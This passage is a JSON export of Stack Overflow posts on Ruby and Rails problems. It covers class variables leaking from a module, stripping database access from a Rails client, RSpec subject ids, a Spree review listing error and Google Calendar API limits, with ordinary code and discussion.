125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511855851, "post_id": 47526242, "comment_id": 82008951, "body": "Nope, not seeing it. Guys, would you bear with my stupidity for a minute and explain why one class_eval is different from the other. <a href=\"https://gist.github.com/stulentsev/89a48dbb706267221669f29d7ada78bf\" rel=\"nofollow noreferrer\">gist.github.com/stulentsev/89a48dbb706267221669f29d7ada78bf</a>"}, {"owner": {"reputation": 12464, "user_id": 1376448, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f16da5431a99911ebc32093a28bc591?s=128&d=identicon&r=PG", "display_name": "kiddorails", "link": "https://stackoverflow.com/users/1376448/kiddorails"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511856093, "post_id": 47526242, "comment_id": 82009097, "body": "@SergioTulentsev - Exactly! Getting that in <code>XYZ.class_variables</code> with <code>class_eval</code> is a mystery. I&#39;m not sure if it&#39;s because of some  behavior of <code>class_eval</code> or just yet another issue with class variables as @sawa is pointing to."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 2, "creation_date": 1511857764, "post_id": 47526242, "comment_id": 82010009, "body": "@SergioTulentsev lol, it\u2019s hoisting of <code>@@foo</code> inside <code>XYZ.included</code>. <code>base.class_variable_set(:@@foo, [])</code> would not pollute <code>XYZ</code>."}, {"owner": {"reputation": 12464, "user_id": 1376448, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f16da5431a99911ebc32093a28bc591?s=128&d=identicon&r=PG", "display_name": "kiddorails", "link": "https://stackoverflow.com/users/1376448/kiddorails"}, "edited": false, "score": 0, "creation_date": 1511857945, "post_id": 47526242, "comment_id": 82010105, "body": "oh. hoisting in module (from method) since class_eval wouldn&#39;t create scope-gate ?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511857994, "post_id": 47526242, "comment_id": 82010136, "body": "Class variables are obviously not affected by scope gates. Otherwise you\u2019ll get issues accessing them from methods."}, {"owner": {"reputation": 12464, "user_id": 1376448, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f16da5431a99911ebc32093a28bc591?s=128&d=identicon&r=PG", "display_name": "kiddorails", "link": "https://stackoverflow.com/users/1376448/kiddorails"}, "edited": false, "score": 0, "creation_date": 1511858097, "post_id": 47526242, "comment_id": 82010197, "body": "Thanks. This explains a lot :)"}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 5, "last_activity_date": 1511858171, "last_edit_date": 1511858171, "creation_date": 1511854443, "answer_id": 47526242, "question_id": 47526117, "link": "https://stackoverflow.com/questions/47526117/class-variables-leaking-when-defined-from-a-module/47526242#47526242", "title": "Class variables leaking when defined from a module?", "body": "<blockquote>\n  <p>I'm not able to figure out why A.dynamic_set 1, 2 didn't work.</p>\n</blockquote>\n\n<p>Use an explicit receiver when calling setters:</p>\n\n<pre><code>def dynamic_set(*args)\n  foo += args # This doesn't work\n  self.foo += args # This DOES work\nend\n</code></pre>\n\n<blockquote>\n  <p>Coming to the main part of the question</p>\n</blockquote>\n\n<p><strong>TL;DR:</strong> Don\u2019t use class variables. Use instance variables at class level.</p>\n\n<pre><code>module XYZ \n  def self.included(base)\n    base.send :extend, ClassMethods\n    base.class_eval do\n      @foo ||= []\n    end \n  end \n\n  module ClassMethods\n    def foo \n      instance_variable_get(\"@foo\")\n    end \n\n    def foo=(arg)\n      instance_variable_set(\"@foo\", arg)\n    end \n\n    def dynamic_set(*args)\n      self.foo += args # This doesn't work\n    end \n\n    def dynamic_set_2(*args)\n      class_variable_set(\"@foo\", instance_variable_get(\"@foo\") + args)\n    end \n  end \nend\n</code></pre>\n\n<hr>\n\n<p>It\u2019s worth to mention it in the answer.</p>\n\n<pre><code>module XYZ\n  def self.included(base)\n    base.class_eval { @@foo ||= [] }\n  end\nend\n</code></pre>\n\n<p>The code above pollutes the <code>XYZ</code> class variables with <code>@@foo</code> <strong>because <code>@@foo</code> is hoisted in <code>XYZ</code> module</strong>. </p>\n\n<p><code>base.class_variable_set(:@@foo, [])</code> instead would not pollute <code>XYZ</code>.</p>\n"}], "owner": {"reputation": 12464, "user_id": 1376448, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f16da5431a99911ebc32093a28bc591?s=128&d=identicon&r=PG", "display_name": "kiddorails", "link": "https://stackoverflow.com/users/1376448/kiddorails"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "accepted_answer_id": 47526242, "answer_count": 1, "score": 3, "last_activity_date": 1511858171, "creation_date": 1511853994, "question_id": 47526117, "link": "https://stackoverflow.com/questions/47526117/class-variables-leaking-when-defined-from-a-module", "title": "Class variables leaking when defined from a module?", "body": "<p>Consider that I have a module <code>XYZ</code>. When included in a class, it extends the base class and adds a <em>class variable</em> <code>@@foo</code> inside it. It also extends the class with the methods to do some <code>get</code> and <code>set</code>. </p>\n\n<pre><code>module XYZ\n  def self.included(base)\n    base.send :extend, ClassMethods\n    base.class_eval do\n      @@foo ||= []\n    end\n  end\n\n  module ClassMethods\n    def foo\n      class_variable_get(\"@@foo\")\n    end\n\n    def foo=(arg)\n      class_variable_set(\"@@foo\", arg)\n    end\n\n    def dynamic_set(*args)\n      foo += args # This doesn't work\n    end\n\n    def dynamic_set_2(*args)\n      class_variable_set(\"@@foo\", class_variable_get(\"@@foo\") + args)\n    end\n  end\nend\n</code></pre>\n\n<p>Now, consider the usage:</p>\n\n<pre><code>class A\n  include XYZ\nend\nA.foo #=&gt; []\nA.class_variable_get(\"@@foo\") #=&gt; []\nA.dynamic_set 1, 2 #=&gt; NoMethodError: undefined method `+' for nil:NilClass\nA.dynamic_set_2 1, 2 #=&gt; [1,2]\nA.foo #=&gt; [1,2]\nA.class_variable_get(\"@@foo\") #=&gt; [1,2]\n</code></pre>\n\n<p>The snippet makes sense and gets the work done, but I'm not able to figure out why <code>A.dynamic_set 1, 2</code> didn't work. </p>\n\n<p>Coming to the main part of the question - If I define a new <code>class B</code> as:</p>\n\n<pre><code>class B\n  include XYZ\nend\nB.foo #=&gt; [1,2] =&gt; Why? How did B.foo get these values?\nB.class_variable_get(\"@@foo\") #=&gt; [1,2] =&gt; Why?\nB.dynamic_set_2 3, 4\nB.foo #=&gt; [1,2,3,4]\nA.foo #=&gt; [1,2,3,4]\n</code></pre>\n\n<p>Why are <code>B</code> and <code>A</code> sharing the same class variable when <code>@@foo</code> is defined on the class level (with <code>class_eval</code>)?</p>\n\n<p>I understand about implications of using class variable and class instance variables. Just trying to figure out why this doesn't work as intended, to clear some concepts :) </p>\n"}, {"tags": ["ruby", "client", "ruby-on-rails-5", "rails-activerecord", "multi-tier"], "comments": [{"owner": {"reputation": 1999, "user_id": 1116381, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/7b470e79f9eb14c32bc0b8f3eb47fbd8?s=128&d=identicon&r=PG", "display_name": "Tachyons", "link": "https://stackoverflow.com/users/1116381/tachyons"}, "edited": false, "score": 1, "creation_date": 1511855883, "post_id": 47526072, "comment_id": 82008964, "body": "Duplicate ? <a href=\"https://stackoverflow.com/questions/19078044/disable-activerecord-for-rails-4\" title=\"disable activerecord for rails 4\">stackoverflow.com/questions/19078044/&hellip;</a>"}, {"owner": {"reputation": 757, "user_id": 3795212, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/987621bf8b5d812def204c0075ed0d2d?s=128&d=identicon&r=PG&f=1", "display_name": "apostrophedottilde", "link": "https://stackoverflow.com/users/3795212/apostrophedottilde"}, "reply_to_user": {"reputation": 1999, "user_id": 1116381, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/7b470e79f9eb14c32bc0b8f3eb47fbd8?s=128&d=identicon&r=PG", "display_name": "Tachyons", "link": "https://stackoverflow.com/users/1116381/tachyons"}, "edited": false, "score": 0, "creation_date": 1511860475, "post_id": 47526072, "comment_id": 82011704, "body": "Thanks! This totally helps. I&#39;m not sure why I didn&#39;t see this with a google."}, {"owner": {"reputation": 1999, "user_id": 1116381, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/7b470e79f9eb14c32bc0b8f3eb47fbd8?s=128&d=identicon&r=PG", "display_name": "Tachyons", "link": "https://stackoverflow.com/users/1116381/tachyons"}, "edited": false, "score": 0, "creation_date": 1511861417, "post_id": 47526072, "comment_id": 82012369, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/19078044/disable-activerecord-for-rails-4\">Disable ActiveRecord for Rails 4</a>"}], "owner": {"reputation": 757, "user_id": 3795212, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/987621bf8b5d812def204c0075ed0d2d?s=128&d=identicon&r=PG&f=1", "display_name": "apostrophedottilde", "link": "https://stackoverflow.com/users/3795212/apostrophedottilde"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 23, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1511854221, "creation_date": 1511853833, "last_edit_date": 1511854221, "question_id": 47526072, "link": "https://stackoverflow.com/questions/47526072/removing-all-database-access-capability-from-rails-5-x-client-app", "title": "Removing all database access capability from rails 5.x client app", "body": "<p>I am still fairly new to ruby and Ruby on Rails framework.</p>\n\n<p>Rails --api only project is great for just getting into bare bones rest API development without any of the unneeded extras.</p>\n\n<p>I would always build a web API app to handle my data access and domain logic. \nI would create a separate rails app for the front end web client. Maybe this seperation of tiers is not always necessary for small or 'pet' projects but I prefer this architecture.</p>\n\n<p>I am trying to find the best way to remove the data access related code and gems from my client project as I will never access the database. </p>\n\n<p>Is there aclean way to do this automatically in a similar way that --api switch includes only things relevant to API app?</p>\n\n<p>It's not the end of the world doing this manually but it would be nice if  I could write a bash script that I can pass a project name and it would build me 2 shell projects - 1 API, 1 client - with only the things I would usually need at each level.</p>\n\n<p>Any suggestions about this are greatly appreciated.</p>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "rspec"], "comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 2, "creation_date": 1511853229, "post_id": 47525877, "comment_id": 82007648, "body": "<code>subject.id</code> or <code>test.id</code>"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511853583, "post_id": 47525877, "comment_id": 82007798, "body": "How this question got two upvotes? Flagged for mod\u2019s attention on who\u2019s upvoted."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511853730, "post_id": 47525877, "comment_id": 82007873, "body": "@mudasobwa: if there was a voting ring, this user&#39;s rep would have been higher :)"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511853785, "post_id": 47525877, "comment_id": 82007903, "body": "@SergioTulentsev not necessarily, it might be a slave asking dumb questions that yield the attention because of upvotes."}, {"owner": {"reputation": 31, "user_id": 9018585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa46e20979e49e54aa81e4cccb110b6a?s=128&d=identicon&r=PG&f=1", "display_name": "E. Jel", "link": "https://stackoverflow.com/users/9018585/e-jel"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511854604, "post_id": 47525877, "comment_id": 82008309, "body": "@mudasobwa sorry if it seemed like too dumb of a question -- turns out I was doing the right thing but because I was still getting an error I thought I was doing something wrong when trying to reference the subject. Turns out something else is wrong with my factories, thanks anyway for the help :)"}], "owner": {"reputation": 31, "user_id": 9018585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa46e20979e49e54aa81e4cccb110b6a?s=128&d=identicon&r=PG&f=1", "display_name": "E. Jel", "link": "https://stackoverflow.com/users/9018585/e-jel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 115, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1511853064, "creation_date": 1511853064, "question_id": 47525877, "link": "https://stackoverflow.com/questions/47525877/using-the-id-of-subjectcreate-in-rspec", "title": "Using the id of subject{create()} in rspec", "body": "<p>I'm pretty new to rspec so I'm not sure how to word this properly so I'll give an example of my situation instead:</p>\n\n<pre><code>subject(:test) { SomeModel.create(name: name, depend: depend) }\nlet(:name){ \"test name\" }\nlet(:depend){ create(:depend, //something here with id of creation of SomeModel) }\n</code></pre>\n\n<p>Depend belongs to SomeModel and so I need the id of SomeModel to create Depend. Is there some way of retrieving the id of the SomeModel I created in the first line? Sorry if this is very unclear as I'm not too sure how to word it.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-4", "spree"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1511852444, "post_id": 47525629, "comment_id": 82007310, "body": "Show us the controller/view, specifically the line where you assign <code>@reviews</code>. It turned out you assigned an integer value to it. <i>Sidenote:</i> \u201cI am new to anything\u201d should not be treated as <i>an excuse</i>."}, {"owner": {"reputation": 2292, "user_id": 5448888, "user_type": "registered", "accept_rate": 56, "profile_image": "https://graph.facebook.com/898095120243525/picture?type=large", "display_name": "Chakreshwar Sharma", "link": "https://stackoverflow.com/users/5448888/chakreshwar-sharma"}, "edited": false, "score": 1, "creation_date": 1511852659, "post_id": 47525629, "comment_id": 82007394, "body": "You are getting wrong value in @reviews. It should be an array instead of fix num"}, {"owner": {"reputation": 201, "user_id": 7666165, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/SakmP.jpg?s=128&g=1", "display_name": "Cliff_Cleet", "link": "https://stackoverflow.com/users/7666165/cliff-cleet"}, "edited": false, "score": 0, "creation_date": 1511859265, "post_id": 47525629, "comment_id": 82010935, "body": "The question has been updated (controller files have been added ). Please review it"}, {"owner": {"reputation": 5669, "user_id": 7429104, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/TZAPt.jpg?s=128&g=1", "display_name": "Aman", "link": "https://stackoverflow.com/users/7429104/aman"}, "edited": false, "score": 0, "creation_date": 1511859846, "post_id": 47525629, "comment_id": 82011305, "body": "<code>&lt;% if @reviews.present? %&gt;</code> use this instead of <code>&lt;% if @reviews.any? %&gt;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511852730, "post_id": 47525769, "comment_id": 82007418, "body": "This should be a comment, not an answer."}, {"owner": {"reputation": 201, "user_id": 7666165, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/SakmP.jpg?s=128&g=1", "display_name": "Cliff_Cleet", "link": "https://stackoverflow.com/users/7666165/cliff-cleet"}, "edited": false, "score": 0, "creation_date": 1511864128, "post_id": 47525769, "comment_id": 82014238, "body": "@Sachin R , when i checked @reviews , ` &lt;%= @reviews.inspect %&gt;` the value i got is an integer as ~ 30. am not getting an array of values.                                           its defined in controller as <code>def collection       params[:q] ||= {}       @search = Spree::Review.ransack(params[:q])       @collection = @search.result.includes([:product, :user, :feedback_reviews]).page(params[:page]).per(params[:per_page&zwnj;&#8203;])       end</code>"}, {"owner": {"reputation": 10770, "user_id": 381874, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/k7VRE.jpg?s=128&g=1", "display_name": "Sachin R", "link": "https://stackoverflow.com/users/381874/sachin-r"}, "edited": false, "score": 0, "creation_date": 1511867151, "post_id": 47525769, "comment_id": 82016420, "body": "can you change the name of method from collection to some other name?  Maybe it will be conflicting some ruby method."}, {"owner": {"reputation": 201, "user_id": 7666165, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/SakmP.jpg?s=128&g=1", "display_name": "Cliff_Cleet", "link": "https://stackoverflow.com/users/7666165/cliff-cleet"}, "edited": false, "score": 0, "creation_date": 1511867410, "post_id": 47525769, "comment_id": 82016578, "body": "@Sachin R, Tried it. But no change"}], "tags": [], "owner": {"reputation": 10770, "user_id": 381874, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/k7VRE.jpg?s=128&g=1", "display_name": "Sachin R", "link": "https://stackoverflow.com/users/381874/sachin-r"}, "is_accepted": false, "score": -1, "last_activity_date": 1511856180, "last_edit_date": 1511856180, "creation_date": 1511852644, "answer_id": 47525769, "question_id": 47525629, "link": "https://stackoverflow.com/questions/47525629/ruby-error-undefined-method-any-for-30fixnum-nomethoderror/47525769#47525769", "title": "Ruby error : undefined method `any &#39; for 30:Fixnum (NoMethodError)", "body": "<p><code>any</code> works with array on and your @reviews are not an array. Please check @reviews object. It should be array.</p>\n"}, {"comments": [{"owner": {"reputation": 201, "user_id": 7666165, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/SakmP.jpg?s=128&g=1", "display_name": "Cliff_Cleet", "link": "https://stackoverflow.com/users/7666165/cliff-cleet"}, "edited": false, "score": 0, "creation_date": 1511866969, "post_id": 47529796, "comment_id": 82016297, "body": "tried changing to <code>@reviews = @collection</code>. But no changes.     I have modified my controller and model.Please have a loot at it.there i have clearly written the code for def collection ."}], "tags": [], "owner": {"reputation": 3819, "user_id": 2871922, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d263eb801e15c1691fc9431e29a8cf03?s=128&d=identicon&r=PG", "display_name": "Toby 1 Kenobi", "link": "https://stackoverflow.com/users/2871922/toby-1-kenobi"}, "is_accepted": false, "score": 0, "last_activity_date": 1511866474, "creation_date": 1511866474, "answer_id": 47529796, "question_id": 47525629, "link": "https://stackoverflow.com/questions/47525629/ruby-error-undefined-method-any-for-30fixnum-nomethoderror/47529796#47529796", "title": "Ruby error : undefined method `any &#39; for 30:Fixnum (NoMethodError)", "body": "<p>It looks like the important code is in your comment on an answer, where it is very difficult to read.</p>\n\n<p>I think you have assigned the variable <code>collection</code> with an integer id, and assigned the result if the database lookup to <code>@collection</code> (which is a different variable)</p>\n\n<p>So to fix it you could change the index action to</p>\n\n<pre><code>@reviews = @collection\n</code></pre>\n"}], "owner": {"reputation": 201, "user_id": 7666165, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/SakmP.jpg?s=128&g=1", "display_name": "Cliff_Cleet", "link": "https://stackoverflow.com/users/7666165/cliff-cleet"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 760, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1511866737, "creation_date": 1511852170, "last_edit_date": 1511866737, "question_id": 47525629, "link": "https://stackoverflow.com/questions/47525629/ruby-error-undefined-method-any-for-30fixnum-nomethoderror", "title": "Ruby error : undefined method `any &#39; for 30:Fixnum (NoMethodError)", "body": "<p>I am trying to list the product reviews in spree back end. But getting the error 'undefined method any '. I am new to ruby,please help me to solve this issue.</p>\n\n<p>Thanks in Advance. </p>\n\n<p><strong><em>Index.html.erb:</em></strong></p>\n\n<pre><code>&lt;% if @reviews.any? %&gt;\n&lt;table class=\"index\"&gt;\n    &lt;colgroup&gt;\n        &lt;col style=\"width: 25%;\"&gt;\n        &lt;col style=\"width: 10%;\"&gt;\n        &lt;col style=\"width: 10%;\"&gt;\n        &lt;col style=\"width: 20%;\"&gt;\n        &lt;col style=\"width: 15%;\"&gt;\n        &lt;col style=\"width: 17%;\"&gt;\n    &lt;/colgroup&gt;\n    &lt;thead&gt;\n        &lt;tr&gt;\n            &lt;th&gt;&lt;%= Spree.t('product') %&gt;&lt;/th&gt;\n            &lt;th&gt;&lt;%= Spree::Review.human_attribute_name(:rating) %&gt;&lt;/th&gt;\n            &lt;th&gt;&lt;%= Spree.t('feedback') %&gt;&lt;/th&gt;\n            &lt;th&gt;&lt;%= Spree::Review.human_attribute_name(:user) %&gt;&lt;/th&gt;\n            &lt;th&gt;&lt;%= Spree::Review.human_attribute_name(:created_at) %&gt;&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;\n    &lt;tbody&gt;\n    &lt;%- @reviews.each do |review| -%&gt;\n        &lt;tr id=\"&lt;%= dom_id review %&gt;\"&gt;\n            &lt;td&gt;\n                &lt;% if review.product %&gt;\n                    &lt;%= link_to review.product.name, product_path(review.product) %&gt;\n                &lt;% end %&gt;\n            &lt;/td&gt;\n            &lt;td class=\"align-center\"&gt;\n                &lt;%= txt_stars(review.rating) %&gt;\n            &lt;/td&gt;\n            &lt;td class=\"align-center\"&gt;\n                &lt;%= link_to \"(#{review.feedback_stars}/#{review.feedback_reviews.size})\", admin_review_feedback_reviews_path(review) %&gt;\n            &lt;/td&gt;\n            &lt;td class=\"align-center\"&gt;\n                &lt;%= review.user_id ? link_to(review.user.try(:email), [:admin, review.user]) : Spree.t(:anonymous) %&gt;&lt;/p&gt;\n                &lt;p&gt;&lt;%= Spree::Review.human_attribute_name(:ip_address) %&gt;: &lt;%= review.ip_address ? link_to(review.ip_address, \"http://whois.domaintools.com/#{review.ip_address}\") : '-' %&gt;&lt;/p&gt;\n            &lt;/td&gt;\n            &lt;td class=\"align-center\"&gt;\n                &lt;%= l review.created_at, :format =&gt; :short %&gt;\n            &lt;/td&gt;\n            &lt;td class=\"actions\"&gt;\n                &lt;%= link_to_with_icon 'check', Spree.t('approve'), approve_admin_review_url(review), :no_text =&gt; true, class: 'approve' unless review.approved %&gt;\n                &amp;nbsp;\n                &lt;%= link_to_edit review, :no_text =&gt; true, :class =&gt; 'edit' %&gt;\n                &amp;nbsp;\n                &lt;%= link_to_delete review, :no_text =&gt; true %&gt;\n            &lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;% end %&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;% else %&gt;\n&lt;div class=\"no-objects-found\"&gt;\n    &lt;%= Spree.t(:no_results) %&gt;\n&lt;/div&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>The above shown is the index.html.erb file , where the listing and ransack search is done.</p>\n\n<p>Model File : <strong><em>review.rb</em></strong></p>\n\n<pre><code>class Spree::Review &lt; ActiveRecord::Base\n\n      belongs_to :product, touch: true\n      belongs_to :user, :class_name =&gt; Spree.user_class.to_s\n      has_many   :feedback_reviews\n\n      after_save :recalculate_product_rating, :if =&gt; :approved?\n      after_destroy :recalculate_product_rating\n\n      validates :name, presence: true\n      validates :review, presence: true\n\n      validates :rating, numericality: { only_integer: true,\n      greater_than_or_equal_to: 1, \n      less_than_or_equal_to: 5,\n      message: Spree.t('you_must_enter_value_for_rating') }\n\n\n      default_scope { order(\"spree_reviews.created_at DESC\") }\n\n      scope :localized, -&gt;(lc) { where('spree_reviews.locale = ?', lc) }\n      scope :most_recent_first, -&gt; { order('spree_reviews.created_at DESC') }\n      scope :oldest_first, -&gt; { reorder('spree_reviews.created_at ASC') }\n      scope :preview, -&gt; { limit(Spree::Reviews::Config[:preview_size]).oldest_first }\n      scope :approved, -&gt; { where(approved: true) }\n      scope :not_approved, -&gt; { where(approved: false) }\n      scope :default_approval_filter, -&gt; { Spree::Reviews::Config[:include_unapproved_reviews] ? all : approved }\n\n      def feedback_stars\n      return 0 if feedback_reviews.size &lt;= 0\n      ((feedback_reviews.sum(:rating) / feedback_reviews.size) + 0.5).floor\n      end\n\n      def set_search\n      @search=Product.search(params[:q])\n      end\n\n      def recalculate_product_rating\n      self.product.recalculate_rating if product.present?\n      end\n      end\n</code></pre>\n\n<p><strong><em>reviews_controller.rb</em></strong></p>\n\n<pre><code>          class Spree::Admin::ReviewsController &lt; Spree::Admin::ResourceController\n      helper Spree::ReviewsHelper\n\n      def index\n      @reviews = collection\n      end\n\n      def approve\n      r = Spree::Review.find(params[:id])\n\n      if r.update_attribute(:approved, true)\n      flash[:notice] = Spree.t(\"info_approve_review\")\n      else\n      flash[:error] = Spree.t(\"error_approve_review\")\n      end\n      redirect_to admin_reviews_path\n      end\n\n      def edit\n      if @review.product.nil?\n      flash[:error] = Spree.t(\"error_no_product\")\n      redirect_to admin_reviews_path and return\n      end\n      end\n\n      private\n\n      def collection\n      params[:q] ||= {}\n      @search = Spree::Review.ransack(params[:q])\n      @collection = @search.result.includes([:product, :user, :feedback_reviews]).page(params[:page]).per(params[:per_page])\n      end\n      end\n</code></pre>\n"}, {"tags": ["ruby", "google-api", "google-calendar-api"], "comments": [{"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1511852050, "post_id": 47524931, "comment_id": 82007122, "body": "I would argue there is a practical limit of events per user because a person simply cannot handle several thousand events per work week."}], "answers": [{"comments": [{"owner": {"reputation": 7734, "user_id": 2490003, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/3dRD0.png?s=128&g=1", "display_name": "user2490003", "link": "https://stackoverflow.com/users/2490003/user2490003"}, "edited": false, "score": 0, "creation_date": 1511989244, "post_id": 47528742, "comment_id": 82081161, "body": "Thanks for the info! Unfortunately that last point worries me as at scale there will definitely be more than 300 external guests being invited :/"}], "tags": [], "owner": {"reputation": 70965, "user_id": 1841839, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZyKjr.png?s=128&g=1", "display_name": "DaImTo", "link": "https://stackoverflow.com/users/1841839/daimto"}, "is_accepted": false, "score": 1, "last_activity_date": 1511863446, "last_edit_date": 1592644375, "creation_date": 1511863446, "answer_id": 47528742, "question_id": 47524931, "link": "https://stackoverflow.com/questions/47524931/is-there-a-limit-to-the-number-of-calendar-events-that-can-be-programmatically-s/47528742#47528742", "title": "Is there a limit to the number of calendar events that can be programmatically scheduled for a given user?", "body": "<p>The google calendar api applies some standard quota limits on you.  Basically the number of requests that you can make.  However when you are planing on using a single user then there will be some other rules you will need to consider</p>\n<p>Copied from <a href=\"https://support.google.com/a/answer/2905486?hl=en\" rel=\"nofollow noreferrer\">here</a></p>\n<blockquote>\n<p>If a user has created more than 10,000 events in 